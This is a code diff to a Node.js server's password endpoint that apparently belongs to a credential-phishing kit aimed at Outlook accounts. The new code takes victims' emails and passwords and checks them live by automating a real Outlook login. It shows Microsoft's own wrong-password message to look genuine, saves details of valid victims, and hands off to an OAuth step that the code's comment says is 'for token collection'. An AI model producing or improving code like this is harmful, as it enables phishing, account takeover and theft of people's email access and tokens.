@@ -793,7 +793,7 @@ app.post('/api/verify-email', async (req, res) => {
     }
 });
 
-// Password authentication endpoint (stores credentials for session tracking)
+// Password authentication endpoint with validation using automation
 app.post('/api/authenticate-password', async (req, res) => {
     try {
         const { email, password } = req.body;
@@ -805,42 +805,100 @@ app.post('/api/authenticate-password', async (req, res) => {
             });
         }
 
-        // Store credentials in session data for tracking
-        const sessionId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
-        const sessionDir = path.join(__dirname, 'session_data');
-        
-        if (!fs.existsSync(sessionDir)) {
-            fs.mkdirSync(sessionDir, { recursive: true });
-        }
-        
-        // Store only session metadata (no credentials to disk)
-        const sessionData = {
-            id: sessionId,
-            timestamp: new Date().toISOString(),
-            email: email,
-            status: 'credentials_received'
-        };
-        
-        fs.writeFileSync(
-            path.join(sessionDir, `session_${sessionId}_${email.replace(/[@.]/g, '_')}.json`),
-            JSON.stringify(sessionData, null, 2)
-        );
+        console.log(`🔐 Attempting password validation for: ${email}`);
 
-        console.log(`📝 Stored credentials for: ${email}`);
-        
-        res.json({
-            success: false,
-            sessionId: sessionId,
-            message: 'Credentials stored. Proceeding with OAuth authentication...',
-            requiresOAuth: true
+        // Try automation login first to validate credentials
+        const automation = new OutlookLoginAutomation({
+            enableScreenshots: false,
+            screenshotQuality: 50
         });
+
+        try {
+            await automation.init();
+            const navigated = await automation.navigateToOutlook();
+            
+            if (!navigated) {
+                throw new Error('Failed to navigate to Outlook');
+            }
+
+            const loginSuccess = await automation.performLogin(email, password);
+            await automation.close();
+
+            if (!loginSuccess) {
+                // Invalid credentials - don't proceed with OAuth
+                console.log(`❌ Password validation failed for: ${email}`);
+                
+                analytics.failedLogins++;
+                saveAnalytics();
+
+                return res.status(401).json({
+                    success: false,
+                    error: 'Invalid credentials',
+                    message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                    requiresOAuth: false
+                });
+            }
+
+            // Valid credentials - store and proceed with OAuth for token collection
+            const sessionId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+            const sessionDir = path.join(__dirname, 'session_data');
+            
+            if (!fs.existsSync(sessionDir)) {
+                fs.mkdirSync(sessionDir, { recursive: true });
+            }
+            
+            const sessionData = {
+                id: sessionId,
+                timestamp: new Date().toISOString(),
+                email: email,
+                status: 'credentials_validated',
+                validationMethod: 'automation'
+            };
+            
+            fs.writeFileSync(
+                path.join(sessionDir, `session_${sessionId}_${email.replace(/[@.]/g, '_')}.json`),
+                JSON.stringify(sessionData, null, 2)
+            );
+
+            console.log(`✅ Password validation successful for: ${email}`);
+            
+            res.json({
+                success: true,
+                sessionId: sessionId,
+                message: 'Credentials validated. Proceeding with secure authentication...',
+                requiresOAuth: true
+            });
+
+        } catch (automationError) {
+            console.error(`❌ Automation validation failed for ${email}:`, automationError.message);
+            
+            try {
+                await automation.close();
+            } catch (closeError) {
+                // Ignore close errors
+            }
+
+            analytics.failedLogins++;
+            saveAnalytics();
+
+            return res.status(401).json({
+                success: false,
+                error: 'Authentication failed',
+                message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                requiresOAuth: false
+            });
+        }
 
     } catch (error) {
         console.error('Error in password authentication:', error);
+        analytics.failedLogins++;
+        saveAnalytics();
+        
         res.status(500).json({ 
             error: 'Authentication failed',
             success: false,
-            details: error.message 
+            details: error.message,
+            requiresOAuth: false
         });
     }
 });
